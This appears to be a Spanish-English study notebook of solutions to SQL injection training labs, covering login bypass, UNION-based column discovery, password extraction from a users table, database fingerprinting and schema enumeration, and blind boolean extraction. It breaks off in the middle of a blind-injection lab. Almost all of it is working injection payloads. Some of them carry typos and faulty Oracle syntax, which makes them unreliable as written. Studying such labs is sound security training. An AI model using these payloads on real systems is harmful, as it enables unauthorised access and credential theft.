SQL injection (SQLi)

1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
   Laboratorio: vulnerabilidad de inyección SQL en la cláusula WHERE que permite la recuperación de datos ocultos

	* validar vulnerabilidad de inyección SQL

	query:

 	  '+OR+1=1--

2. Lab: SQL injection vulnerability allowing login bypass
   Laboratorio: vulnerabilidad de inyección SQL que permite omitir el inicio de sesión

	* ingresar en el username o nombre de usuario

	query:

	  administrator'--


3.Lab: SQL injection UNION attack, determining the number of columns returned by the query
  Laboratorio: Ataque UNION de inyección SQL, determinando el número de columnas devueltas por la consulta
	
	* validar vulnerabilidad de inyección SQL

	* encontrar el numero de columnas

	  ' ORDER BY 1--
	  ' ORDER BY 2--
	  ' ORDER BY 3--
	  ' ...

	or

	  ' UNION SELECT NULL--
	  ' UNION SELECT NULL,NULL--
	  ' UNION SELECT NULL,NULL,NULL--
	  ' ...	

	query:

	  '+ORDER+BY+3--
	  '+UNION+SELECT+NULL,NULL,NULL--			** Microsoft, MySQL, PostgreSQL
	  '+UNION+SELECT+NULL,NUL,NULL+FROM+DUAL--	** ORACLE

4.SQL injection UNION attack, finding a column containing text 
  Laboratorio: Ataque UNION de inyección SQL, encontrando una columna que contiene texto

	* validar vulnerabilidad de inyección SQL

	* encontrar el numero de columnas ambos métodos

	* validar cual es de tipo string

	  ' UNION SELECT 'a',NULL,NULL--
	  ' UNION SELECT NULL,'a',NULL--
	  ' UNION SELECT NULL,NULL,'a'--
	  '...

	query:

	  '+ORDER+BY+2--
	  '+UNION+SELECT+NULL,'a'--			** Microsoft, MySQL, PostgreSQL
	  '+UNION+SELECT+NULL,'a'+FROM+DUAL--	** ORACLE
		

5. Lab: SQL injection UNION attack, retrieving data from other tables
   Laboratorio: Ataque UNION de inyección SQL, recuperación de datos de otras tablas

	* validar vulnerabilidad de inyección SQL

	* encontrar el numero de columnas ambos métodos

	* validar cual es de tipo string

	* extraer datos de otras tablas
	
	query:

	  '+UNION+SELECT+username,password+FROM+users--



*** Recuperar múltiples valores dentro de una sola columna ***


   concatenar valores en una columna

	Database type 		Query
	==========================================================================
	Microsoft 		' UNION SELECT username + '~' + password FROM users--
	MySQL 		' UNION SELECT username '~' password FROM users--
	Oracle		' UNION SELECT username || '~' || password FROM users--
	PostgreSQL 		' UNION SELECT username || '~' || password FROM users--


	
6.  SQL injection UNION attack, retrieving multiple values in a single column
    Laboratorio: Ataque UNION de inyección SQL, recuperación de múltiples valores en una sola columna

	* validar vulnerabilidad de inyección SQL

	* encontrar el numero de columnas ambos métodos

	* validar cual es de tipo string

	* concatenar y extraer valores de otras tablas

	query:

	  '+UNION+SELECT+NULL,username||'~'||password+FROM+users--


	
*** Examinando la base de datos en ataques de inyección SQL ***


   Consultar el tipo y la versión de la base de datos   

	Database type 		Query
	=======================================================
	Microsoft, MySQL 		SELECT @@version
	Oracle 			SELECT * FROM v$version
					SELECT banner FROM v$version
					SELECT version FROM v$instance
	PostgreSQL 			SELECT version()  
   

	query

	  ' UNION SELECT @@version--


7. Lab: SQL injection attack, querying the database type and version on Oracle
   Laboratorio: Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en Oracle

	* validar vulnerabilidad de inyección SQL

	* encontrar el numero de columnas ambos métodos

	* validar cual es de tipo string

	  ' UNION SELECT 'a',NULL,NULL FROM DUAL--
	  ' UNION SELECT NULL,'a',NULL FROM DUAL--
	  ' UNION SELECT NULL,NULL,'a' FROM DUAL--
	  '...
	  
	* combinar el paso anterior con la query de consulta tipo y versión de la base de datos 

	query:

	  '+UNION+SELECT+banner,NULL+FROM+v$version+DUAL--	opción 1
	  '+UNION+SELECT+version,NULL+FROM+v$instance+DUAL--	opción 2



8. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
   Laboratorio: Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en MySQL y Microsoft


	* encontrar el numero de columnas opción 1 para database MySQL
	  
	  ' ORDER BY 1#	tambien con -- \
	  ' ORDER BY 2#	tambien con -- \
	  ' ORDER BY 3#	tambien con -- \
	  ' ...

	* validar cual es de tipo string

	  ' UNION SELECT 'a',NULL,NULL#	tambien con -- \
	  ' UNION SELECT NULL,'a',NULL#	tambien con -- \
	  ' UNION SELECT NULL,NULL,'a'#	tambien con -- \
	  '...

	* combinar el paso anterior con la query de consulta tipo y versión de la base de datos 

	query:
	
	  '+UNION+SELECT+@@version,NULL-- \		opción 1
        '+UNION+SELECT+@@version,NULL#		opción 2



*** Listado del contenido de la base de datos ***

	
	* Microsoft, MySQL, PostgreSQL

   listar las tablas en una database:
	
	
	SELECT * FROM information_schema.tables


TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE


   listar columnas de una tabla identificada:
	
	SELECT * FROM information_schema.columns WHERE table_name = 'Users'


TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar


	* ORACLE

   listar las tablas en una database:	

	SELECT * FROM all_tables


   listar columnas de una tabla identificada:

	SELECT * FROM all_tab_columns WHERE table_name = 'USERS'



9. Lab: SQL injection attack, listing the database contents on non-Oracle databases
   Laboratorio: Ataque de inyección SQL, enumerando el contenido de la base de datos en bases de datos que no son de Oracle

	* validar vulnerabilidad de inyección SQL

	* encontrar el numero de columnas ambos métodos

	* validar cual es de tipo string
	
	* consultar el tipo y versión database
	
	* listar las tablas de la database

	query:

	  '+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--

	* listar las tablas de la database

	query:

	  '+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='nombre_tablas_idenficadas'--		

	* concatenar y extraer valores de otras tablas

	query:

	  '+UNION+SELECT+NULL,username||'~'||password+FROM+users--




10. Lab: SQL injection attack, listing the database contents on Oracle
    Laboratorio: Ataque de inyección SQL, enumerando el contenido de la base de datos en Oracle

	* validar vulnerabilidad de inyección SQL

	* encontrar el numero de columnas ambos métodos

	* validar cual es de tipo string
	
	* consultar el tipo y versión database
	
	* listar las tablas de la database

	query:

	  '+UNION+SELECT+table_name,NULL+FROM+all_tables+DUAL--

	* listar las tablas de la database

	query:

	  '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='nombre_tablas_identificadas'--

	* concatenar y extraer valores de otras tablas

	query:

	  '+UNION+SELECT+NULL,username||'~'||password+FROM+users--



*** Vulnerabilidades de inyección de SQL ciega ***

	* Inyectar una nueva condición en lógica booleana o desencadenar condicionalmente un error como una división por cero.

	* Desencadenar condicionalmente un retraso de tiempo en el procesamiento de la consulta

	* Desencadenar una interacción de red fuera de banda mediante técnicas OAST (Out-of-band application security testing). Extraer los datos colocandolos en una búsqueda de DNS para un dominio controlado.


	
	Explotación blind SQLi mediante la activación de respuestas condicionales

	   Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

	   query para validar la cookie:
		
		SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'

	   condición inyectada:

		…xyz' AND '1'='1		* devolverá un resultado
		…xyz' AND '1'='2		* no devuelve nada

	   
		xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm	* devolverá un resultado si el primer caracter del password es mayor a m
		
		xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't	* no devuelve nada si el primer caracter del password es mayor a t
		
		xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's	* devolverá un resultado si el primer caracter del password es igual a s



11. Lab: Blind SQL injection with conditional responses
    Laboratorio: Inyección SQL ciega con respuestas condicionales

	* identificar la cookie de seguimiento: F12, en almacenamiento, cookies, TraickingId
		
	   TrackingId:"QxjjfVPHWkMCkLu5"

	* consultar la cookie de seguimiento
	   
	   '+SELECT+TrackingId+FROM+TrackedUsers+WHERE+TrackingId='QxjjfVPHWkMCkLu5'



